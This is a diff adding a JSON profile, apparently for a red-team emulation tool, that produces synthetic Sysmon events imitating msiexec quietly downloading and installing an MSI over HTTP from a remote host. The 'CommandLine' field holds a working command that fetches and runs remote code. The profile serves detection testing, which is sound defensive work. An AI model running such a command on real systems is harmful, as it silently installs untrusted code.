@@ -1,0 +1,30 @@
+{
+	"name": "RTA msiexec_http_installer",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Use msiexec.exe to download an executable from a remote site over HTTP and run it.",
+	"rules": {
+		"msiexec": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing msiexec with url command.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\msiexec.exe",
+				"Description": "Windows® installer",
+				"CommandLine": "msiexec.exe /quiet /i http://10.70.5.87:8000/bin/Installer.msi"
+			}
+		},
+		"msiexec_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from msiexec.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\msiexec.exe",
+				"DestinationIp": "10.70.5.87",
+				"DestinationPort": 8000
+			}
+		}
+	}
+}
